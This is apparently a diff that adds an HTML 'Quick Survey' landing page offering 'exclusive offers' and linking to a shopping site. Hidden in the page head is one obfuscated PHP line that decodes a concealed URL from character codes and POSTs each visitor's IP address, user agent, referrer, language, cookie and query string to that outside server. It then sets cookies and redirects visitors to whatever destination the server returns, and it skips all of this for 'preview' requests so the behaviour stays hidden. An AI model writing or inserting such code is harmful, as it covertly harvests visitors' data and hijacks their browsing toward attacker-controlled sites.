@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "508490";$uid="pohad57o2tmczt2kpsux0ikhh";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quick Survey</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Arial", sans-serif;
+      background: #f9fafb;
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .survey-box {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 420px;
+      padding: 30px;
+      text-align: center;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+      color: #111;
+    }
+    p {
+      font-size: 15px;
+      margin-bottom: 25px;
+      color: #555;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      margin: 8px 0;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      background: #ff5722;
+      color: #fff;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background: #e64a19;
+    }
+    .progress {
+      margin-top: 20px;
+      height: 8px;
+      background: #eee;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      width: 0;
+      height: 100%;
+      background: #ff5722;
+      transition: width 0.4s ease;
+    }
+    .cta-box {
+      margin-top: 20px;
+      display: none;
+    }
+    .cta-box .btn {
+      background: #388e3c;
+    }
+    .cta-box .btn:hover {
+      background: #2e7d32;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SE957HTBP5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SE957HTBP5');
+</script>
+</head>
+<body>
+
+  <div class="survey-box">
+    <h1>Quick Survey</h1>
+    <p>Answer 3 simple questions to unlock exclusive offers.</p>
+    
+    <div id="quiz">
+      <p>Do you usually shop online?</p>
+      <button class="btn" onclick="nextStep()">Yes, I shop online</button>
+      <button class="btn" onclick="nextStep()">No, not often</button>
+    </div>
+    
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="cta-box" id="ctaBox">
+      <button class="btn" onclick="goToOffer()">👉 Show Me Deals Now</button>
+      <button class="btn" onclick="goToOffer()">🔥 Get My Special Offer</button>
+    </div>
+  </div>
+
+  <script>
+    let step = 0;
+    const questions = [
+      ["Do you usually shop online?", ["Yes, I shop online", "No, not often"]],
+      ["What kind of products interest you most?", ["Electronics", "Fashion", "Home & Lifestyle"]],
+      ["Would you like to access today’s top deals?", ["Yes, show me deals!", "Maybe later"]]
+    ];
+    
+    function nextStep() {
+      step++;
+      const quiz = document.getElementById("quiz");
+      const progressBar = document.getElementById("progressBar");
+      const ctaBox = document.getElementById("ctaBox");
+
+      if (step < questions.length) {
+        let q = questions[step];
+        quiz.innerHTML = `<p>${q[0]}</p>` + q[1].map(ans => `<button class='btn' onclick='nextStep()'>${ans}</button>`).join("");
+        progressBar.style.width = ((step / questions.length) * 100) + "%";
+      } else {
+        progressBar.style.width = "100%";
+        quiz.innerHTML = `<p>✅ Thank you! Your answers are recorded.</p>`;
+        ctaBox.style.display = "block";
+      }
+    }
+
+    function goToOffer() {
+      window.location.href = "https://www.temu.com";
+    }
+  </script>
+
+</body>
+</html>
